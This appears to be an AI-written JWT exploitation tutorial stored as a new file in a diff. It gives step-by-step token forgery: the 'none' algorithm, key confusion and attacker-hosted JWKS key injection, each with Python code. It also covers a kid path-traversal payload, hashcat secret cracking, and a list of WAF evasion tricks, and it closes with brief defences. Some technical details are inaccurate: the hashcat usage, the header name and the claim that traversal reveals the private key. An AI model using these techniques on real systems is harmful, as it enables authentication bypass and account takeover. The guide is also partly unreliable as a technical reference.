@@ -1,0 +1,290 @@
+Okay, let's dive into JWT (JSON Web Token) exploitation. This guide will cover common vulnerabilities, exploitation techniques, and defenses.  We'll cover everything from header manipulation to cryptographic weaknesses.
+
+**Disclaimer:**  This information is for educational purposes only.  Do not attempt to exploit systems without explicit authorization. Unauthorized access is illegal and unethical.  Use this knowledge responsibly.
+
+**JWT Exploitation: A Step-by-Step Guide**
+
+**I. Understanding JWT Structure**
+
+Before we can exploit JWTs, we need to understand their structure:
+
+A JWT is a string composed of three parts, separated by dots (`.`):
+
+1.  **Header:**  Contains metadata about the token, like the algorithm (`alg`) used for signing and the type of token (`typ`).  Encoded in base64url.
+2.  **Payload:** Contains the claims (statements) about the user or entity.  Examples include `sub` (subject), `iss` (issuer), `exp` (expiration time), and custom claims.  Also encoded in base64url.
+3.  **Signature:**  Calculated by applying a cryptographic algorithm (specified in the header) to the encoded header and payload, using a secret key (for HMAC algorithms) or a private key (for RSA/ECDSA algorithms).  Also encoded in base64url.
+
+**Example:**
+
+```
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
+```
+
+*   **Header (decoded):** `{"alg": "HS256", "typ": "JWT"}`
+*   **Payload (decoded):** `{"sub": "1234567890", "name": "John Doe", "iat": 1516239022}`
+*   **Signature:** `SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c`
+
+**II. Reconnaissance and Identification**
+
+1.  **Identify JWT Usage:** Look for `Authorization: Bearer <JWT>` headers in HTTP requests or cookies named `jwt`, `auth_token`, or similar. Intercept traffic using a proxy like Burp Suite or OWASP ZAP.
+
+2.  **Decode the JWT:** Use online tools like `jwt.io`, libraries like `PyJWT` (Python), or `jose` (JavaScript) to decode the header and payload.  This reveals the claims and algorithm used.
+
+3.  **Identify Key Vulnerable Claims:**
+
+    *   `alg`: Check the algorithm used for signing.
+    *   `exp`: Check the expiration time.  Expired tokens *should* be rejected.
+    *   `iss`:  Check the issuer.
+    *   Custom claims: Analyze custom claims for any potentially exploitable information.
+
+**III. Exploitation Techniques**
+
+Here's a breakdown of common JWT vulnerabilities and how to exploit them:
+
+**1. Algorithm Confusion (None Algorithm)**
+
+*   **Vulnerability:** The server accepts JWTs with the `alg` header set to `"none"`.  With this algorithm, no signature is required, allowing an attacker to forge tokens.
+*   **Exploitation:**
+
+    1.  Obtain a valid JWT (or create a completely new one with any payload you want).
+    2.  Modify the header:  Change `"alg": "HS256"` to `"alg": "none"`.
+    3.  Remove the signature part of the JWT (the part after the second `.`).
+    4.  Use the modified JWT in your requests.
+
+    **Example:**
+
+    *   Original JWT Header: `{"alg": "HS256", "typ": "JWT"}`
+    *   Modified JWT Header: `{"alg": "none", "typ": "JWT"}`
+
+    *   Original JWT: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c`
+    *   Exploited JWT: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluaXN0cmF0b3IiLCJpYXQiOjE1MTYyMzkwMjJ9.`  (Note the empty signature).
+
+    **Tools:** Burp Suite Repeater, `jwt.io`
+
+**2. Algorithm Confusion (HMAC vs. RSA/ECDSA)**
+
+*   **Vulnerability:** The server misinterprets the `alg` header and uses the public key as a secret key for HMAC validation.  This is especially dangerous if you can control the `jwks_uri` or `kid` header.
+*   **Explanation:** RSA/ECDSA use public/private key pairs.  HMAC uses a shared secret.  If the server expects RSA/ECDSA but uses the *public key* with an HMAC algorithm (like HS256), anyone with the public key can forge tokens.
+*   **Exploitation:**
+
+    1.  Obtain the public key of the server (often available via a JWKS endpoint – see below).
+    2.  Craft a JWT where the `alg` is set to `HS256` (or another HMAC algorithm) and the payload contains the claims you want.
+    3.  Sign the JWT using the *public key* as the "secret".
+
+    **Tools:**  `jwt.io`, `openssl`, PyJWT, Burp Suite
+
+    **Example (Python with PyJWT):**
+
+    ```python
+    import jwt
+
+    public_key = "-----BEGIN PUBLIC KEY-----\n...\n-----END PUBLIC KEY-----\n"  # Replace with the actual public key
+
+    payload = {"user": "admin"}
+    header = {"alg": "HS256", "typ": "JWT"}
+
+    token = jwt.encode(payload, public_key, algorithm="HS256", headers=header)
+    print(token)
+    ```
+
+**3.  Key Injection via `jwks_uri` or `kid`**
+
+*   **Vulnerability:** The server retrieves the public key from a URI specified in the `jwks_uri` header or uses a key ID (`kid`) to lookup the key in a JWKS (JSON Web Key Set) endpoint. If you can control these headers, you can point the server to your own controlled key.
+*   **Exploitation:**
+
+    1.  **Set up a controlled server:** Create a web server (e.g., using Python's `http.server`) that serves a JSON file containing your public key in JWKS format.
+    2.  **Craft a JWT with a malicious `jwks_uri`:** Modify the JWT header to include `jwks_uri` pointing to your server. Also, set the `kid` to something you control within the JWKS.
+    3.  **Sign the JWT with your *private* key** (corresponding to the public key you're serving).
+
+    **Example JWKS File (served from your server):**
+
+    ```json
+    {
+      "keys": [
+        {
+          "kty": "RSA",
+          "kid": "my-key-id",
+          "n": "your_rsa_public_key_modulus",  // Replace with your actual RSA modulus
+          "e": "AQAB"
+        }
+      ]
+    }
+    ```
+
+    **Crafted JWT Header:**
+
+    ```json
+    {
+      "alg": "RS256",
+      "typ": "JWT",
+      "jwks_uri": "http://your-controlled-server.com/jwks.json",
+      "kid": "my-key-id"
+    }
+    ```
+
+    **Python example:**
+
+    ```python
+    import jwt
+    from jwcrypto.jwk import JWK
+    import json
+
+    # Generate a key pair
+    key = JWK.generate(kty='RSA', size=2048)
+    private_key = key.export_private()
+    public_key = key.export_public()
+
+    # Create Payload
+    payload = {'user': 'admin'}
+
+    # Create Header
+    header = {
+        "alg": "RS256",
+        "typ": "JWT",
+        "jwks_uri": "http://your-controlled-server.com/jwks.json", # replace with server ip:port
+        "kid": "my-key-id"
+    }
+    # Create Token
+    token = jwt.encode(payload,private_key,algorithm='RS256',headers=header)
+    print(token)
+
+    # create JWKS file
+    jwks = {
+        "keys":[
+            {
+                "kty": "RSA",
+                "kid": "my-key-id",
+                "n":json.loads(public_key)['n'],
+                "e":json.loads(public_key)['e']
+            }
+        ]
+    }
+    with open("jwks.json","w") as f:
+        json.dump(jwks,f)
+
+    ```
+    * Run the server with: `python -m http.server 8000` (or any available port)
+    * The `jwks.json` file will need to reside in the web server directory.
+
+**4. Key Confusion with `kid` Parameter**
+
+*   **Vulnerability:**  If the application uses the `kid` parameter to retrieve keys based on filename, and it is vulnerable to path traversal, an attacker could potentially retrieve arbitrary files, including the server's private key.
+*   **Exploitation:**
+    1.  Identify the location where the keys are stored and the pattern by which the application finds the keys based on the `kid`.
+    2.  Craft a JWT header with a `kid` value using path traversal sequences like `"../"` to attempt to access files outside of the intended directory.
+
+    **Example:**
+    ```json
+    {
+      "alg": "RS256",
+      "typ": "JWT",
+      "kid": "../../../etc/passwd"  // Try to read a system file
+    }
+    ```
+
+**5. Brute-Forcing the Secret Key (for HMAC)**
+
+*   **Vulnerability:** If the secret key used for HMAC signing is weak or predictable, it can be brute-forced.
+*   **Exploitation:**
+
+    1.  **Obtain a valid JWT:** Capture a JWT from the target application.
+    2.  **Use tools like `hashcat` or `john`:**  These tools can be used to brute-force the key using wordlists or common password patterns.
+
+    **Example (using `hashcat`):**
+
+    ```bash
+    hashcat -m 16500 <jwt_signature> <wordlist.txt>
+    ```
+
+    *   `-m 16500` specifies the hash type as HMAC-SHA256.
+    *   `<jwt_signature>` is the signature part of the JWT (from the third part of the JWT string).
+    *   `<wordlist.txt>` is a file containing a list of potential secret keys.
+
+**6. Replay Attacks**
+
+*   **Vulnerability:** If the application does not properly validate the `exp` (expiration) claim or lacks other replay protection mechanisms, an attacker can reuse an old, valid JWT indefinitely.
+*   **Exploitation:**
+
+    1.  Obtain a valid, unexpired JWT.
+    2.  Continue using the same JWT even after it *should* have expired.  This only works if the server doesn't properly check the `exp` claim.
+
+**7. JWT Confusion with Session Cookies**
+
+*   **Vulnerability:**  If the application uses both JWTs *and* session cookies, and doesn't properly validate which one to trust, an attacker might be able to inject a modified JWT and bypass authentication.  This is more of a logical flaw in the application's authentication logic than a JWT-specific vulnerability.
+*   **Exploitation:**
+
+    1.  Observe how the application handles JWTs and session cookies.
+    2.  Attempt to modify the JWT (e.g., using one of the techniques above) while maintaining a valid session cookie.
+    3.  See if the application prioritizes the (modified) JWT over the session cookie, granting you unauthorized access.
+
+**IV. WAF (Web Application Firewall) Bypass Techniques**
+
+WAFs often try to detect and block common JWT exploitation attempts. Here are some bypass techniques:
+
+1.  **Character Encoding:**
+
+    *   Use URL encoding (`%`) for special characters in the header or payload.
+    *   Try alternative encodings like double encoding.
+
+2.  **Case Manipulation:**
+
+    *   Change the case of the `alg` value (`None`, `NONE`, `nOnE`).
+    *   Change the case of claim names (`Sub`, `sUb`).
+
+3.  **Whitespace Injection:**
+
+    *   Add spaces before or after the `.` separators in the JWT string.
+    *   Add spaces around the `=` in base64 encoded parts.
+
+4.  **Newline Characters:**
+
+    *   Insert newline characters (`\n`, `%0a`) into the JWT string.
+
+5.  **JSON Injection/Casting:**
+
+    *   Use JSON casting to confuse the WAF (e.g., `"alg": "none"` to `"alg": ["none"]`)
+
+6.  **Invalid JSON Syntax:**
+
+    *   Deliberately introduce minor syntax errors in the JSON to confuse the WAF parser while still being parsable by the backend.
+
+7.  **Varying the Request Method:**
+
+    *   Sometimes, WAF rules are more aggressive on `POST` requests than `GET` requests. Try using `GET` requests with the JWT in the query string if possible.
+
+8.  **Content-Type Manipulation:**
+
+    *   If the WAF is inspecting the `Content-Type`, try changing it. Sometimes a `Content-Type` of `application/x-www-form-urlencoded` might bypass certain rules.
+
+9.  **JWKS URI Obfuscation:**
+
+    * Use IP Address for the server instead of the hostname.
+    * Host the `jwks.json` on alternate ports or subdomains
+
+**V. Tools**
+
+*   **jwt.io:** Online JWT decoder and encoder.
+*   **Burp Suite:**  Web proxy for intercepting and modifying HTTP requests.
+*   **OWASP ZAP:**  Another popular web proxy.
+*   **Hashcat/John the Ripper:**  Password cracking tools.
+*   **PyJWT (Python):**  JWT library for Python.
+*   **JOSE (JavaScript):** JWT Library for Javascript.
+*   **jwktojava:** Tool to convert jwk to java class.
+
+**VI. Defense Strategies**
+
+1.  **Use Strong Algorithms:**  Prefer RSA/ECDSA algorithms (RS256, ES256) over HMAC algorithms (HS256) if possible.  HMAC requires keeping the secret key secure.
+2.  **Never Accept `"alg": "none"`:**  Completely disable support for the "none" algorithm.
+3.  **Strictly Validate Claims:**  Always validate the `exp` (expiration) claim, `iss` (issuer) claim, and any other relevant claims.  Consider using `nbf` (not before) to prevent tokens from being used before a certain time.
+4.  **Rotate Keys Regularly:**  Change the signing keys periodically to limit the impact of a compromised key.
+5.  **Implement Proper Key Management:**  Store secret keys securely and restrict access to them.
+6.  **Use JWKS (JSON Web Key Set):**  Publish your public keys in a JWKS endpoint.  This allows clients to automatically discover and use the correct public key for verification.
+7.  **Whitelist Allowed Algorithms:**  Explicitly define which algorithms are permitted.
+8.  **Input Validation:**  Sanitize and validate all input, including JWT headers and payloads.
+9.  **Rate Limiting:**  Implement rate limiting to prevent brute-force attacks.
+10. **Web Application Firewall (WAF):** Configure a WAF to detect and block common JWT attacks.
+11. **Regular Security Audits:**  Conduct regular security assessments and penetration tests to identify and address vulnerabilities.
+
+**VII. Summary**
+
+JWT exploitation is a serious threat.  By understanding the JWT structure, common vulnerabilities, and exploitation techniques, you can better protect your applications.  Remember to always prioritize strong algorithms, proper key management, and strict validation of claims. Stay up-to-date with the latest security best practices and regularly audit your applications for vulnerabilities. Employ defenses in depth, including WAFs and rate limiting. Also, keep in mind that this is a constantly evolving field, and new vulnerabilities are discovered regularly. Continuous learning and adaptation are key to maintaining a strong security posture.
